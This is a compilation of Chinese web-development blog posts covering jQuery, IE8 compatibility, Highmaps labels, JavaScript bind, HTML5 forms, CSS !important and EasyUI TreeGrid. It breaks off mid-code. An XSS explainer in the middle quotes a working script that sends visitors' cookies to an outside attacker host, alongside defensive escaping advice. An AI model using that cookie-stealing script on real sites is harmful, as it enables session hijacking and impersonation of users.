    h1.toggleClass( "big" );

    if ( h1.hasClass( "big" ) ) {

        ...

    }
Classes还能够被用来存储关于一个元素的状态信息，例如表明哪个元素被选择。
大小
jQeury提供了丰富的方法用来获取和修饰一个元素的尺寸和定位信息。
下面的代码展示了jQuery中获取元素尺寸大小功能的一个简短概述。如果需要jQuery操作元素尺寸大小方法的全部细节，参见dimensions documentation on api.jquery.com。
    // 基础的尺寸大小方法。

    //设置所有<h1>元素的宽度。
    $( "h1" ).width( "50px" );

    //获取第一个<h1>元素的宽度。
    $( "h1" ).width();

    //设置所有<h1>元素的高度。
    $( "h1" ).height( "50px" );     

    //获取第一个<h1>元素的宽度。
    $( "h1" ).height();

    // 返回一个对象，包含第一个<h1>相于对于它的“父元素偏移（定位）”的定位信息。
    $( "h1" ).position();
原文地址

            $(function () {
                $('pre.prettyprint code').each(function () {
                    var lines = $(this).text().split('\n').length;
                    var $numbering = $('<ul/>').addClass('pre-numbering').hide();
                    $(this).addClass('has-numbering').parent().append($numbering);
                    for (i = 1; i <= lines; i++) {
                        $numbering.append($('<li/>').text(i));
                    };
                    $numbering.fadeIn(1700);
                });
            });
        
IE兼容性开发的笔记

当前项目组开发的产品对外承诺支持IE9和IE11，但在推广应用过程中发现存在相当比例的用户实际上还在使用IE8，而这相当比例中的用户还包括了大部分的公司领导。为了满足公司内部各阶层人士体验我们产品的诉求，开发团队的上层领导经过协商，决定投入专门的精力来完成IE8的支持。本文是笔记，记录了整改过程中发现、解决的一些问题。

IE兼容模式

简单的说，即是在jsp页面的头部增加如下的代码，指定浏览器以最高模式来呈现页面。对于我们项目组的产品来说，如下的代码可以保证IE8、IE9、IE11的用户在打开页面时，都可以得到最佳的体验。
<meta http-equiv="X-UA-Compatible" content="IE=edge">
至于这行代码的具体含义，可以问度娘，相信会有满意的答复。
如果没有这行代码，当前项目开发的jsp页面在IE8模式下打开时，会报一些稀奇古怪的、和jquery、JSON相关的错误，加上这行代码之后，这些错误就消失了。

字符串的trim方法

项目组内开发人员在页面上大量应用到了字符串的trim方法，IE9及其以上版本的IE浏览器都默认提供了trim方法，但IE8并没有提供，因此页面上使用trim方法的地方都会报js错。解决方法比较简单，直接使用jquery提供的trim方法，比如"axdfa ".trim()替换为$.trim("axdfa ")，问题即可解决。

变量定义

页面上有一个div，id为xxxx，代码样例如下。

<div id="xxxxx"></div>
此时js代码中如出现如下的代码，并且xxxxx没有使用var来声明，那么js在执行到如下一行时会报错，提示信息是对象不支持此属性或方法。
xxxxx = 1;
这个问题初始发现时让我纠结了相当长时间，分析思路一度跑偏，以为是IE8的js引擎对于语法要求比较高，而IE9和IE11的语法要求比较低；但奇怪的是，网上并没有搜索到相关的话题，所以并不确定。后来经高手启发，并反复尝试之后，才发现当页面上存在前述场景时，IE8模式下js代码是一定会报错的。
明确了问题之后，修改方法就非常明确了，要么修改div的id，要么使用变量前用var来显式初始化。


数组的遍历

对于数组var a = [1,2,4,]，在IE8下，使用下标方式和jquery的each方法遍历数组时，会多遍历得到一个null对象；而使用IE9、IE11则不会存在这个问题。因此数组的最后一个元素之后切记不可增加“,”，否则会导致页面的js在IE8时出现诡异的表现。

数组的indexOf方法

IE8不支持数组的indexOf方法，为了满足在数组中查找对象的需要，代码中通常会为数组扩展indexOf方法。这引入一个问题，在使用foreach方式遍历数组时，indexOf方法也会作为数组的一个成员被遍历到，这比较讨厌；而使用下标方式和jquery的each方法来遍历数组，则不会引入这个问题。
if (!Array.prototype.indexOf) {
Array.prototype.indexOf = function () {
// ...
}
}

因此我个人建议是不要为数组提供indexOf方法的实现，直接使用jquery的inArray方法，也可以达到相同的效果，但需要注意的是inArray方法在使用时，被查询对象在前，数组对象在后。




欢迎访问Jackie的家，http://jackieathome.sinaapp.com/，如需转载文章，请注明出处。


版权声明：本文为博主原创文章，未经博主允许不得转载。

使用jQuery的ajax同步请求吃过的亏
jQuery是一个很常用的js库。甚至我们开发任何一个项目都首先把jquery导入进行。jQuery太过强大，使用起来非常方便。但是在使用的过程中也遇到过很多坑。我在这里分享一下，避免大家也遇到同样的问题束手无策，也方便以后回归学习。普通的写法:$.ajax({
	url:url,
	type:'POST',
	async:false,
	data:{
		id:1
	},
	dataType:'json',
	timeout:666666,
	success:function(resultObj){
	}
});这里有两个要点：1.有些版本的async这个属性，不能加引号(如：'false'或"false"就不起作用)2.dataType这个属性必须和返回的响应内容对应。即返回xml的话，就不能使用dataType:'json',这样会导致success回调函数不执行。3.timeout设置请求超时时间（毫秒）。此设置将覆盖全局设置。设置过大，数字过长，部分浏览器就不支持了。具体使用查看http://jquery.cuishifeng.cn/jQuery.Ajax.html在线api欢迎大家关注我的博客！如有疑问,请加QQ群：454796847共同学习！

版权声明：本文为博主原创文章，未经博主允许不得转载。

​Highmaps网页图表教程之绘图区显示标签显示数据标签定位

​Highmaps网页图表教程之绘图区显示标签显示数据标签定位

Highmaps数据标签定位

由于数据标签是和节点一一对应，所以数据标签是依据节点位置进行定位的。本节详细讲解如何对数据标签进行定位。

Highmaps节点定位

在mappoint、mapbubble、mapline图表类型，节点都有明确位置。而在map图表类型中，节点对应的是一个区域。所以，map图表类型的节点中心位置就可以由用户来设定。设置时候需要使用到以下两个配置项：

middleX: Number1

middleY: Number2

其中，参数Number1指定节点中心在水平方向的位置，值的范围为0~1。0表示节点对应区域的最左端，1表示最右端；默认值为0.5。参数Number2指定节点中心在垂直方向的位置，值的范围为0~1。0表示区域的最顶端，1表示最底端；默认值为0.5。

Highmaps对齐定位

在节点确定后，用户就可以设置数据标签相对节点的水平和垂直对齐方式了。下面依次讲解这两种方式：

（1）使用配置项align设置水平对齐方式。其语法如下：


align: String


其中，参数String指定水平的对齐方式，允许的值包括left、center、right，默认值为center。例如，如果用户设置为left，就表示数据标签的左端和节点对齐。

（2）使用配置项verticalAlign设置垂直对齐方式。其语法如下：


verticalAlign:String


其中，参数String指定垂直的对齐方式，允许的值包括top、middle、bottom，默认值为middle。如果用户设置为top，就表示数据标签的顶端和节点对齐。

Highmaps节点偏移

数据标签相对节点定位后，用户还可以对其位置进行一定的偏移。这时需要使用到以下两个配置项。

（1）使用配置项x设置水平偏移距离，其语法如下：


x: Number


其中，参数Number指定水平偏移位置，单位为px，默认值为0。

（2）使用配置项y设置垂直偏移距离，其语法如下：


y: Number


其中，参数Number指定垂直偏移位置，单位为px，默认值为1。

【实例4-6：dataLabelsposition】下面对节点位置进行设置。核心代码如下：


                series: [{

                    dataLabels: {

                        enabled: true,

                        color:'red',

                        middleX: 0.5,                                        //设置节点中心的水平位置

                        middleY: 0.5,                                        //设置节点中心的垂直位置

                        align: 'left',                                             //设置水平对齐方式

                        verticalAlign: 'top',                                //设置垂直对齐方式

                        x: 0,                                                         //设置水平偏移距离

                        y:0                                                           //设置垂直偏移距离

                    },

                }],


执行代码后，效果如图4.6所示。




图4.6  重新设置数据标签的位置

Highmaps标签框架

标签文本外围就是标签框架。Highmaps允许用户定义框架的颜色，填充色和边框。下面依次讲解几项。

1.边框

边框是标签框架的轮廓。默认状态下，边框线宽为为0，所以看不到边框。用户可以设置边框的以下三个方面：


q  边框颜色：borderColor:
 Color

q  边框圆角：borderRadius:
 Number1

q  边框线宽：borderWidth:
 Number2


其中，参数Color指定边框的颜色；参数Number1指定边框的圆角半径，单位为px，默认值为0；参数Number2指定边框的线宽，单位为px，默认值为0

2.形状

默认状态下，边框的形状为矩形square。用户可以根据需要，使用配置项shape重新指定。其语法如下：


shape: String


其中，参数String指定边框形状，允许的值包括circle（圆形）、diamond（菱形）、square（矩形）、triangle（三角形）、triangle-down（倒三角形）。默认值为square。

3.背景色

为了凸显数据，用户使用配置项backgroundColor还可以设置边框的填充颜色。其语法如下：


backgroundColor: Color


其中，参数Color指定填充色颜色。

【实例4-7：dataLabelsborder】下面指定数据标签框架样式。核心代码如下：


                series: [{

                    dataLabels: {

                        borderWidth: 2,                                           
 //设置边框线宽

                        borderColor: 'black',                                           
 //设置边框颜色

                        shape: 'circle',                                                      
 //设置边框形状

                        backgroundColor:'black'                                   
 //设置填充颜色

                    },

                }],


执行代码后，效果如图4.7所示。




图4.7  设置数据标签边框

Highmaps标签显示模式

标签阴影

当用户为标签添设置边框线宽度或者填充颜色后，还可以为标签设置阴影效果。设置标签阴影需要借助shadow配置项。其语法如下：


shadow: Boolean|Object


该配置型的值可以为布尔类型，也可以是对象类型。当值为false时，表示禁用阴影效果；当值为true时，启用阴影效果。当值为对象时，用户可以设置阴影的具体效果。其结构如下：


{

    color:Color,

    offsetX:Number1,

    offsetY:Number2,

    opacity:Number3,

    width:Number4

}


其中，参数Color指定阴影的颜色；参数Number1和Number2指定阴影的水平和垂直偏移距离，单位为px；参数Number3指定阴影的透明度，值为0~1之间；参数Number4指定阴影的宽度，单位为px。

Highmaps超出绘图区显示

当节点元素接近绘图区边缘时，节点对应的数据标签往往会超出绘图区范围。默认状态下，Highmaps会自动调整数据标签的位置。如果调整后，仍然超出绘图区，则不显示该数据标签。为了避免这种情况，用户可以手动设置显示模式，避免数据标签位置的调整和舍弃。这时需要使用以下两个配置项。

（1）使用配置项overflow设置标签的浮动模式。其语法如下：


overflow: String


其中，参数String指定浮动模式类型，允许的值为justify和none。当值为justify时，Highmaps会根据情况自动调整数据标签位置；当值为none时，则禁用Highmaps的自动调整。

（2）使用配置项crop设置是否舍弃超出范围的数据标签。其语法如下：


crop: Boolean


该配置型的值为布尔类型。当值为true时，会舍弃超出绘图区的数据标签；当值为false，则显示全部的数据标签。

Highmaps绘图区内显示

在绘图区内显示时，数据标签不仅涉及和其他元素的层叠问题，还涉及多个数据标签之间互相层叠问题。下面依次讲解这两个问题。

1.和其他元素的层叠

如果数据标签被其他图表元素覆盖，这时可以通过设置数据标签的配置项zIndex来调整。其语法如下：


zIndex: Number


其中，参数Number指定层叠顺序值，默认值为6。值越大，显示越靠上。

2.标签之间的层叠

当地图区域很多时，各个区域的数据标签很容易发生层叠问题。由于同属一类元素，所以通过zIndex无法进行设置。这时候，用户可以使用数据节点配置项data提供的子配置项labelrank来设置。其语法如下：


labelrank: Number


其中，参数Number指定该节点对应的数据标签显示优先级。数值越大，优先级越高，越显示在上层。不同优先级的数据标签发生层叠后，低优先级的数据标签会被隐藏。

如果用户只希望覆盖，而不希望发生隐藏，可以设置配置项allowOverlap。其语法如下：


allowOverlap: Boolean


该配置项的值为布尔类型。当值为true时，允许数据标签重叠，而不隐藏；当值为false时，则不允许重叠。

本文选自：Highmaps网页图表基础教程大学霸内部资料，转载请注明出处，尊重技术尊重IT人！



版权声明：本文为博主原创文章，未经博主允许不得转载。

用bind方法保持this上下文
最近自学JavaScript，学到bind方法这块儿有些地方不太明白，自己就查了些资料，结合自己的理解写了这篇文章以备后面回顾用。。。其实应该还是搬砖为主吧。
什么是this对象
先来说说什么是this对象吧，每个函数在调用的时候都会自动获取两个特殊变量：this和arguments对象。this值具体是指哪个对象是和该函数的执行环境相关的。如果是作为对象的方法，那么this就是对象实例本身；如果是一个全局函数，那么this就是window对象。用一句话来概括，this就是调用这个方法的对象。
保持this上下文
有时候，我们需要保持this的上下文，也就是在一个执行环境中想要访问到另一个执行环境的this值。在什么时候需要这么做呢？比如说将一个对象的方法赋值给了一个全局变量，然后在全局变量中调用这个方法，那么this值就不再是原来的对象而是window对象了，然而可能我们仍需要在全局环境中按照对象的方法来调用。又比如说一个方法中包含了闭包，闭包是无法访问到其外部函数的this对象的，因为this对象是在调用方法的时候自动生成，内部函数在搜索这两个变量的时候只会搜索到其自身的活动对象，而不会沿着作用域链往外搜索，所以闭包访问不到外部函数的this值。如果要想访问，就应该想办法把this值传递下去。 
通常可以通过这样的方式保持this上下文：在外部函数中将this缓存到一个变量中，通常变量名称使用self, _this 或者 context，那么闭包就可以通过这个可访问的变量来获取外部函数的this值，this上下文得以保持。比如下面的代码：
var myObj = {

    specialFunction: function () {},
    getAsyncData: function (cb) {
        cb();
    },

    render: function () {
        var that = this;
        this.getAsyncData(function () {
            that.specialFunction();
        });
    }
};
myObj.render();
这里有一个对象myObj，它有一个render实例方法，在这个方法内部又调用了它的另一个实例方法getAsyncData，而这个方法有一个新的函数作为参数，这个函数相当于是一个闭包，是不能获取到外部函数中的this值的，为了在这个闭包中也能访问实例方法，需要获取到外部环境的this值，这里把this（this为调用render方法的对象，即实例对象myObj）缓存到了变量that中。
此外还可通过bind方法，这就是本文所要讲述的重点。
bind方法
bind方法生成了一个新的函数，称为绑定函数，传入bind方法的第一个参数作为这个绑定函数的this对象，传入bind的第二个参数连同后面调用绑定函数时传入的参数按照先后顺序（传入bind的在前）构成绑定函数的参数。 
现在我们把上面的例子修改一下：
render: function () {
    this.getAsyncData(function () {

        this.specialFunction();

    }.bind(this));

}
.bind()创建了一个函数，当这个函数在被调用的时候，它的 this 关键词会被设置成被传入的值（这里指调用bind()时传入的参数） 
再看一个bind的使用例子：
var foo = {
    x: 3
} 
var bar = function(){
    console.log(this.x);
} 
bar(); 
// undefined

var boundFunc = bar.bind(foo);

boundFunc(); 
// 3
将bar方法和foo对象绑定后，bar中的this对象被替换为了foo，并生成了一个新的函数boundFunc，因此在全局环境中调用boundFunc时，也可以访问到foo对象的属性。 
还可以了解一下Function.prototype.bind()内部是什么样的：
Function.prototype.bind = function (scope) {
    var fn = this;//this是调用bind方法的对象（别的方法对象）
    return function () {
        return fn.apply(scope);//把fn环境中的this替换为scope
    };
}
可看出，bind方法返回了一个新的函数，这个方法返回了原方法（调用bind的方法）通过apply修改作用域（传入的参数scope）后的执行结果。如果调用这个新函数则会立即执行fn.apply(scope)，并返回执行后的结果。
fn.bind()
与call、apply的区别
call、apply是修改函数的作用域，并且立即执行，而bind是返回了一个新的函数，不是立即执行，即call and apply call a function while bind creates a function。bind在回调函数中常用到。
参考资料： 
理解 JavaScript 中的 Function.prototype.bind 
js中bind、call、apply函数的用法 
https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/bind

            $(function () {
                $('pre.prettyprint code').each(function () {
                    var lines = $(this).text().split('\n').length;
                    var $numbering = $('<ul/>').addClass('pre-numbering').hide();
                    $(this).addClass('has-numbering').parent().append($numbering);
                    for (i = 1; i <= lines; i++) {
                        $numbering.append($('<li/>').text(i));
                    };
                    $numbering.fadeIn(1700);
                });
            });
        

版权声明：本文为博主原创文章，未经博主允许不得转载。

Web安全之XSS跨站脚本攻击
本文主要选择常见web攻击手段之一的XSS（跨站点脚本攻击）来进行讲解，说明其攻击原理，并提出相应的解决办法。

XSS
XSS 攻击，全称是“跨站点脚本攻击”（Cross Site Scripting），之所以缩写为 XSS，主要是为了和“层叠样式表”（Cascading Style Sheets，CSS）区别开，以免混淆。 
XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其他用户使用的页面中。XSS是针对Web站点的客户隐私的攻击，当客户详细信息失窃或受控时可能引发彻底的安全威胁。大部分网站攻击只涉及两个群体：黑客和 Web 站点，或者黑客和客户端受害者。与那些攻击不同的是，XSS 攻击同时涉及三个群体：黑客、客户端和 Web 站点。XSS 攻击的目的是盗走客户端 cookies，或者任何可以用于在 Web 站点确定客户身份的其他敏感信息。手边有了合法用户的标记，黑客可以继续扮演用户与站点交互，从而冒充用户。 
举例来说，可以利用 XSS 攻击窥视用户的信用卡号码和私有信息。通过利用 Web 站点的访问特权，在受害者（客户端）浏览器上运行恶意的JavaScript代码来实现。这些是非常有限的JavaScript特权，除了与站点相关的信息，一般不允许脚本访问其他任何内容。重点强调的是，虽然 Web 站点上存在安全漏洞，但是 Web 站点从未受到直接伤害。但是这已经足够让脚本收集 cookies，并且将它们发送给黑客。 
跨站脚本攻击有两种攻击形式： 
1. 反射型跨站脚本攻击 
    攻击者会通过社会工程学手段，发送一个URL连接给用户打开，在用户打开页面的同时，浏览器会执行页面中嵌入的恶意脚本。 
2. 存储型跨站脚本攻击 
    攻击者利用web应用程序提供的录入或修改数据功能，将数据存储到服务器或用户cookie中，当其他用户浏览展示该数据的页面时，浏览器会执行页面中嵌入的恶意脚本。所有浏览者都会受到攻击。 
3. DOM跨站攻击 
    由于html页面中，定义了一段JS，根据用户的输入，显示一段html代码，攻击者可以在输入时，插入一段恶意脚本，最终展示时，会执行恶意脚本。 
    DOM跨站和以上两个跨站攻击的差别是，DOM跨站是纯页面脚本的输出，只有规范使用javascript，才可以防御。

原理
读到这里，相信大家对XSS的概率已经有了一定的理解，下面我们通过举例来说说攻击的原理。 
如果下面是我们网站的一段PHP代码：
<tr>
<td><?=$row["id"] ?></td>
<td><?=$row["pname"]?></td>
<td><?=$row["pdesc"]?></td>
<td><?=$row["ptype"]?></td>
</tr>
那么攻击者可以在添加产品时插入恶意脚本： 

攻击者发布产品后，等待用户浏览产品列表页面，用户浏览页面如下： 
 
就会执行攻击者写的inbreak.net/a.js恶意脚本。脚本内容如下：
a=document.createElement("iframe");
function b(){e=escape(document.cookie);
c=["http://www.inbreak.net/kxlzxtest/testxss/a.php?cookie=",e,Math.random()];
document.body.appendChild(a);a.src=c.join();}
setTimeout('b()',5000);
其功能是获取当前浏览者的cookie，并发送到a.php，用户的cookie已经就会到攻击者的服务器上。攻击者利用浏览器插件，将自己的cookie替换成刚刚获取的用户的cookie，就可以狸猫换太子的冒充用户了。

防御
原理说清楚了，再来谈谈如何防御吧。 
最基本的防御就是对用户的输入进行转义，例如 
<script type='text/javascript'>alert('hello world')</script> 
如果直接保存这个字符串的话，然后再输出的话，就会运行JS了。 
我们需要将这个字符串转义成
"&lt;script type='text/javascript'&gt;alert('hello world')&lt;/script&gt;"
有些语言自带的就有一些函数来实现转义的功能。 
比如php中，提供了 htmlspecialchars() 函数可以将HTML 特殊字符转化成在网页上显示的字符实体编码。这样即使用户输入了各种HTML 标记，在读回到浏览器时，会直接显示这些HTML 标记，而不是解释执行。 
这里举一个例子：
<b> 欢迎：<?= $welcome_msg?></b>
攻击者输入：
<script>evil_script()</script>
结果为：
<b>欢迎：<script>evil_script()</script></b>
分析可以得知，在HTML 正文背景下，< > 字符会引入HTML 标记，& 可能会认为字符实体编码的开始，所以需要将< > & 转义。为简洁起见，直接使用 htmlspecialchars() 将5 种HTML 特殊字符转义，如：
<b>欢迎：<?= htmlspecialchars($welcome_msg, ENT_NOQUOTES)?></b>
其中ENT_NOQUOTES的意思是不对单引号和双引号进行编码。 
而其他语言，比如.net，则有微软提供的类库AntiXSS，它的实现原理是白名单机制。使用起来也很简单，就是通过AntiXss.GetSafeHtmlFragment(html)方法，来替换掉html里的危险字符。代码如下：
    var html = "<a href=\"#\" onclick=\"alert();\">aaaaaaaaa</a>javascript<P><IMG SRC=javascript:alert('XSS')><javascript>alert('a')</javascript><IMG src=\"abc.jpg\"><IMG><P>Test</P>";

string safeHtml = AntiXss.GetSafeHtmlFragment(html);
Console.WriteLine(safeHtml);

上面的危险内容会被成功替换为：
<a href="">aaaaaaaaa</a>javascript
<p><img src="">alert('a')<img src="abc.jpg"><img></p>
<p>Test</p>

同样的，在java中，也可以通过引入第三方的jar包，来避免XSS攻击，比如commons-lang-2.5.jar。 
    即使不使用自带的方法或者第三方库，我们还可以通过自己编写方法来实现转义。
    private String cleanXSS(String value) {
        value = value.replaceAll("<", "& lt;").replaceAll(">", "& gt;");
        value = value.replaceAll("\\(", "& #40;").replaceAll("\\)", "& #41;");
        value = value.replaceAll("'", "& #39;");
        value = value.replaceAll("eval\\((.*)\\)", "");
        value = value.replaceAll("[\\\"\\\'][\\s]*javascript:(.*)[\\\"\\\']", "\"\"");
        value = value.replaceAll("script", "");
        return value;
    }

这种自定义函数过滤器的方法，不仅仅防御XSS攻击，还可以防御CSRF攻击和SQL注入等安全问题。

            $(function () {
                $('pre.prettyprint code').each(function () {
                    var lines = $(this).text().split('\n').length;
                    var $numbering = $('<ul/>').addClass('pre-numbering').hide();
                    $(this).addClass('has-numbering').parent().append($numbering);
                    for (i = 1; i <= lines; i++) {
                        $numbering.append($('<li/>').text(i));
                    };
                    $numbering.fadeIn(1700);
                });
            });
        

版权声明：本文为博主原创文章，未经博主允许不得转载。

jquery制作banner图片左右上下切换滚动特效


原文：jquery制作banner图片左右上下切换滚动特效

源代码下载地址：http://www.zuidaima.com/share/1607124681411584.htm










版权声明：本文为博主原创文章，未经博主允许不得转载。

HTML5基础知识汇总_(2)自定义属性及表单新特性
自定义属性data-*
说起这个属性,其实现在很常见了;怎么说呢,因为在一些框架都能看到他的身影!!! 
比如Jquery mobile,里面非常频繁的使用了这个属性;
这个属性是哪里来的….当然是跟随最新的H5一起出来的….. 
兼容性在PC端只能呢说一般般(目前.比较老式浏览器居多),,手机端支持还是比较OK的;
虽说是自定义属性,但是还是有一定的规格的,,比如前缀必须是data-[自定义属性];
比如
    <div data-id="id"></div>
这货有什么用呢?用来操作数据的居多,比如给一款游戏弄一些额外的信息!!(data-level,data-score); 
而操作数据一般有两种方式(原生JS和JQ): 
1. 利用 getAttribute、setAttribute 存取 data[原生JS操作] 
2. 利用 dataset API 存取 dataset [这种可以直接忽略data-,类似对象直接访问属性,也是JS操作的] 
3. jQuery使用attr 和 data 依次等同于上面两种
在网上发现了一篇讲解比较详细的操作数据,可以瞄瞄 
传送门: http://blog.netsh.org/posts/html-data-jquery_1812.netsh.html

表单的进化!
input增加的特性!
email
邮箱: <input type="email" name="user_email" >

若是用submit提交会验证Email,检查是否缺少@,@后面是否为空….挺齐全的

url
首页: <input type="url" name="user_url" >

同上,会检查内容格式,目前只支持绝对路径!!!!

number
页数: <input type="number" name="pagin" min="1" max="30" />

有四个属性: 
min : 最小值 , 小于会报错提醒
max : 最大值, 大于会报错提醒
step : 默认为1, 可以看需求设置
value : 设置默认值,这个跟传统的一样 

range
范围:<input type="range" name="range" min="5" max="25" />

这个和上面那个非常相似,连属性值都一致了..就是表现形式不同,,显示为滚动条
值得一提的是,宽高度的不一致决定了滚动条的方向是水平还是垂直;h>w.垂直!!

Date pickers
 <input type="[attribute]" name="user_week" />
[attribute]换成下面的属性就能看到各种效果了,,就是兼容性不怎么样,chrome下正常; 
等到各大浏览器都支持良好了,就能取代JS日期选择器了…. 一条代码搞定一个日期选择;

date - 选取日、月、年
month - 选取月、年
week - 选取周和年
time - 选取时间（小时和分钟）
datetime - 选取时间、日、月、年（UTC 时间）
datetime-local - 选取时间、日、月、年（本地时间）

search
<input type="search" name="user_search" > 

跟text相比,多了一个可关闭的X;还有一些样式上的区别;其他基本一致

tel
联系方式： <input type="tel" name="user_tel" > 

和text大同小异,支持任何字符输入

color
最喜欢的颜色： <input type="color" name="color" > 

这个属性兼容性不是很好,但是可以支持的浏览器体验很好,就是一个color picker!!!

required
邮箱: <input type="email" name="user_email" required="required">

防止域为空时提交表单,返回值是boolean, 设置了必须通过验证才能提交

placeholder
邮箱: <input type="email" name="user_email" required="required" placeholder="请输入您的邮箱!!">

这个属性见怪不怪了,,有点类似占位符,显示一行浅灰色的字体,但是又是可以编辑的,也可以通过JS获取当输入为空的时候,用placeholder的值替换

pattern
电话号码: <input type="text" name="phone"
pattern="[1-9]{11}" title="联系人号码" />

目前很少看到, 但是正则却很常见,,待慢慢普及吧

novalidate
<form action="#" method="post" novalidate="true">
邮箱: <input type="email" name="user_email" required="required" placeholder="请输入您的邮箱!!" novalidate="true">
<input type="submit" />
</form>

H5特性之一,验证表单值;
novalidate的作用就是取消验证,可作用于表单和input元素;
默认不设置则为验证!

multiple
<form action="#" method="post" novalidate="true">
邮箱: <input type="email" name="user_email" required="required" placeholder="请输入您的邮箱!!" novalidate="true" multiple="multiple">
<input type="submit" />
</form>

支持上传(file)和邮箱控件(email)输入多个值,值之间用逗号隔开(半角)

autofocus
    <input autofocus="autofocus" type="text">

自动获取焦点

autocomplete
    <input autofocus="autofocus" type="text" autocomplete="no">

h5下该属性增加了开关功能(on/off),来决定是否自动完成


表单新元素
datalist
搜索引擎: <input type="url" list="url_list" name="link" />
        <datalist id="url_list">
            <option label="Bing" value="http://www.bing.com" />
            <option label="Baidu" value="http://www.baidu.com" />
            <option label="Microsoft" value="http://www.microsoft.com" />
        </datalist>

如需把 datalist 绑定到输入域，请用输入域的 list 属性引用 datalist 的 id
下拉默认值设置在option的value中

keygen
<form action="#" method="post">
用户名: <input type="text" name="usr_name" >
加密方式: <keygen name="security" >
<input type="submit" >
</form>

很多浏览器对这属性支持还不大完善,,,,
加密方式两种,原理还是通过公钥和密钥的方式(类似SSH)

progress
<progress value="5" max="70">
</progress>

进度条制作利器!!,用来判断file这些的加载挺不错的….
必须设置max值才能显示对应的进度条,,不支持百分比!!!

meter
<div>您的额度：<meter value="50001" min="0" max="10000" low="1000" high="9000" optimum="6000">尽情耍!!</meter> </div>

用的不多,,目前;也是进度条效果
min/max是最小值和最大值;
value是当前值
low和high是低于和高于最优值(optimum)


总结
表单来了一次大跃进,但是吧,,目前还是没法顺心的用,,一些浏览器没跟上,还有一些用户使用老版本浏览器; 
所以这些新特性的使用,,哪怕再人性化,也只能慢慢来;过渡总需要时间的~~~

            $(function () {
                $('pre.prettyprint code').each(function () {
                    var lines = $(this).text().split('\n').length;
                    var $numbering = $('<ul/>').addClass('pre-numbering').hide();
                    $(this).addClass('has-numbering').parent().append($numbering);
                    for (i = 1; i <= lines; i++) {
                        $numbering.append($('<li/>').text(i));
                    };
                    $numbering.fadeIn(1700);
                });
            });
        

版权声明：本文为博主原创文章，未经博主允许不得转载。

CSS 之！important
今天写代码，碰到一个关于!important的问题。由于之前并没有好好理解这个概念，所以今天特意查了下资料做个总结。


CSS的原理：

我们知道，CSS写在不同的地方有不同的优先级， .css文件中的定义 < 元素style中的属性，但是如果使用!important，事情就会变得不一样。

首先，先看下面一段代码：


<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>测试Css中的!Important区别</title> 
</head> 
<style type="text/css">
.testClass{ 
color:blue !important;
}
</style>
<body>
    <div class="testClass" style="color:red;">
        测试Css中的Important
    </div>
</body>
</html>


虽然元素的style中有testClass类的定义，但是在上面的css定义中的用!important限定的定义却是优先级最高的，无论是在ie6-10或者Firefox和Chrome表现都是一致的，都显示蓝色。

这种情况也同时可以说明ie6是可以识别!important的，只是这个是ie6的一个缺陷吧。如果写成下面的样式，ie6是识别不出来的：
.testClass{ 
color:blue !important;
color:red;
}

这样，在ie6下展示的时候会显示成红色。

当然，也可以通过以下方式来让ie6识别：

.testClass{ 
color:blue !important; 
} 
.testClass{ 
color:red; 
}

通过以上方式也是可以让ie6显示成蓝色的。

以上实例说明使用!important的css定义是拥有最高的优先级的。只是在ie6下出了一点小的bug，注意书写方式一般可以轻松避开的。



版权声明：本文为博主原创文章，未经博主允许不得转载。

EasyUI的TreeGrid应用
权限系统的菜单管理采用了EasyUI的TreeGrid，实现了菜单管理的新增、删除、修改、初始化、拖拽改变顺序或层级等，贴出代码：
1、view页面
<link rel="stylesheet" type="text/css" href="/content/js/easyui/themes/default/easyui.css">
<link rel="stylesheet" type="text/css" href="/content/js/easyui/themes/icon.css">
<link rel="stylesheet" type="text/css" href="/content/js/easyui/demo/demo.css">
<script type="text/javascript" src="/content/js/easyui/jquery.min.js"></script>
<script type="text/javascript" src="/content/js/easyui/jquery.easyui.min.js"></script>

<table id="syscaidan" title="菜单管理" class="easyui-treegrid" style="width:100%;"></table>

<script>
    $(function() {
       
        $('#syscaidan').treegrid({
            loadMsg: '数据加载中,请稍后……',
            url: 'listdata',
            lines: true,
            rownumbers: false,
            idField: 'syscaidanid',
            treeField: 'mingcheng',
            toolbar:[{  
                text:'新增外部菜单',iconCls:'icon-add',handler:function(){  
                    window.location.href='edit';  
                }  },  
                {
                    text: '加载最新菜单', iconCls: 'icon-reload', handler: function () {
                        $('#syscaidan').treegrid('reload');
                }  
                },
                {
                    text: '恢复到原始状态', iconCls: 'icon-tip', handler: function () {
                        if (confirm("该操作将重置所有菜单，确定进行初始化？")) {
                            $.getJSON("chushihua", function (json) {
                                alert(json.msg);
                                if (json.success == true)
                                    $('#syscaidan').treegrid('reload');
                            });
                        }
                    }
                }
            ],
            columns: [
                [
                    { field: 'mingcheng', title: '菜单名称', width: 200 },
                    { field: 'biaoshi', title: '菜单标示', width: 100 },
                    { field: 'yuanshimingcheng', title: '原始名称', width: 100 },
                    { field: 'tanchu', title: '是否弹出', width: 100 },
                    { field: 'shifouxianshi', title: '是否显示', width: 100 },
                    { field: 'leixing', title: '类型', width: 100 },
                    { field: 'tianjiariqi', title: '添加日期', width: 100 },
                    {
                        field: 'syscaidanid',
                        title: '操作',
                        width: 100,
                        align: 'center',
                        formatter: function(value, row, index) {
                            var editbtn = '', delbtn = '';
                            if (row.shangji != -1)
                                var editbtn = '<a href="edit?syscaidanid=' + row.syscaidanid + '" class="ope-edit" >修改</a> ';
                            if (row.leixing == '人工添加')
                                delbtn = '<a href="javascript:void(0)" class="ope-delete" onclick="del(' + row.syscaidanid + ')">删除</a>';
                            return editbtn + delbtn;
                        }
                    }
                ]
            ],
            onLoadSuccess: function(row) {
                //启用拖动排序
                enableDnd($('#syscaidan'));
            }
        });
    });

    //删除
    function del(syscaidanid) {
        if (confirm("确定要删除吗？")) {
            $.getJSON("delete?syscaidanid=" + syscaidanid, function (json) {
                alert(json.msg);
                if(json.success==true)
                    $('#syscaidan').treegrid('reload');
            });
        }
    }

    //拖动实现
    function enableDnd(t) {
        var nodes = t.treegrid('getPanel').find('tr[node-id]');
        nodes.find('span.tree-hit').bind('mousedown.treegrid', function () {
            return false;
        });
        nodes.draggable({
            disabled: false,
            revert: true,
            cursor: 'pointer',
            proxy: function (source) {
                var p = $('<div class="tree-node-proxy tree-dnd-no"></div>').appendTo('body');
                p.html($(source).find('.tree-title').html());
                p.hide();
                return p;
            },
            deltaX: 15,
            deltaY: 15,
            onBeforeDrag: function () {
